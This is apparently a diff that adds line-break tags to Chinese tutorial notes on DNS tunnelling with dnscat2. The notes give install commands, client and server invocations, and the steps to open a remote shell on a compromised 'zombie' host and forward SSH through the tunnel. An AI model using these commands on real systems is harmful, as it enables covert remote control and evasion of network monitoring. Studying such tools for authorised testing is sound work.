@@ -101,51 +101,51 @@ dns2tcpc -r ssh -z dns28.xxx.com 192.168.1.28 -l 8888 -d 2<br>
 https://www.freebuf.com/articles/network/208242.html<br>
 https://www.cnblogs.com/bonelee/p/7927706.html<br>
 *******************************************************************<br>
-7、a 安装 
-服务端 
-debian9安装ruby环境: apt-get install ruby-full 
-git clone https://github.com/iagox86/dnscat2.git 
-cd dnscat2 
-cd server 
-gem install bundler 
-bundle install 
-客户端 
-git clone https://github.com/iagox86/dnscat2.git 
-cd dnscat2/client/ 
-make
+7、a 安装<br>
+服务端 <br>
+debian9安装ruby环境: apt-get install ruby-full <br>
+git clone https://github.com/iagox86/dnscat2.git <br>
+cd dnscat2 <br>
+cd server <br>
+gem install bundler <br>
+bundle install <br>
+客户端 <br>
+git clone https://github.com/iagox86/dnscat2.git <br>
+cd dnscat2/client/<br> 
+make<br><br>
 
-b 使用 
-在服务端机器上，执行： 
-root@kali:/opt/dnscat2/server# 
-ruby dnscat2.rb //可以不带任何参数执行 
-ruby dnscat2.rb –dns “domain=dns.hxsec.com,host=192.168.1.28,port=5353” –no-cache 
-在客户端机器上，执行： 
-[root@centos7vm client]# 
-./dnscat –dns server=192.168.1.28,port=5353 –secret=7296f13b2295b56a9e451ac3c418c96f
+b 使用 <br>
+在服务端机器上，执行： <br>
+root@kali:/opt/dnscat2/server# <br>
+ruby dnscat2.rb //可以不带任何参数执行 <br>
+ruby dnscat2.rb –dns “domain=dns.hxsec.com,host=192.168.1.28,port=5353” –no-cache <br>
+在客户端机器上，执行： <br>
+[root@centos7vm client]# <br>
+./dnscat –dns server=192.168.1.28,port=5353 –secret=7296f13b2295b56a9e451ac3c418c96f<br><br>
 
-c 进一步操作 
-可以用”sessions”命令来查看已经创建的会话 
-进入建立的session并与其交互： 
-dnscat2> session -i 1
+c 进一步操作 <br>
+可以用”sessions”命令来查看已经创建的会话 <br>
+进入建立的session并与其交互：<br> 
+dnscat2> session -i 1<br>
 
-输入”shell”命令即可，它就会开启一个新的窗口，进入到目标系统的shell中 
-command (centos7vm) 1> shell
+输入”shell”命令即可，它就会开启一个新的窗口，进入到目标系统的shell中 <br>
+command (centos7vm) 1> shell<br>
 
-与新的终端中打开的shell会话中进行交互，输入下面这两条命令： 
-command (centos7vm) 1> windows 
-command (centos7vm) 1> session -i 2 
-sh (centos7vm) 2> uname -a 
-sh (centos7vm) 2> Linux centos7vm
+与新的终端中打开的shell会话中进行交互，输入下面这两条命令： <br>
+command (centos7vm) 1> windows <br>
+command (centos7vm) 1> session -i 2 <br>
+sh (centos7vm) 2> uname -a <br>
+sh (centos7vm) 2> Linux centos7vm<br>
 
-建立DNS隧道转发 
-dnscat2> session -i 1 
-command (centos7vm) 1> listen 127.0.0.1:1188 192.168.1.28:10022
+建立DNS隧道转发 <br>
+dnscat2> session -i 1 <br>
+command (centos7vm) 1> listen 127.0.0.1:1188 192.168.1.28:10022<br>
 
-Usage: listen [:] : //kali地址及端口 肉鸡IP及端口
+Usage: listen [:] : //kali地址及端口 肉鸡IP及端口<br>
 
-Kali上用SSH登录肉鸡，在Kali上连接本地1188，将转发至肉鸡10022端口 
-root@kali:~#ssh root@127.0.0.1 -p 1188 
-参考：https://blog.csdn.net/localhost01/article/details/86591685 
-https://blog.csdn.net/ddr12231/article/details/102306989 
-https://blog.csdn.net/weixin_30389003/article/details/94863001 
+Kali上用SSH登录肉鸡，在Kali上连接本地1188，将转发至肉鸡10022端口 <br>
+root@kali:~#ssh root@127.0.0.1 -p 1188 <br>
+参考：https://blog.csdn.net/localhost01/article/details/86591685 <br>
+https://blog.csdn.net/ddr12231/article/details/102306989 <br>
+https://blog.csdn.net/weixin_30389003/article/details/94863001 <br>
 https://www.4hou.com/tools/17226.html
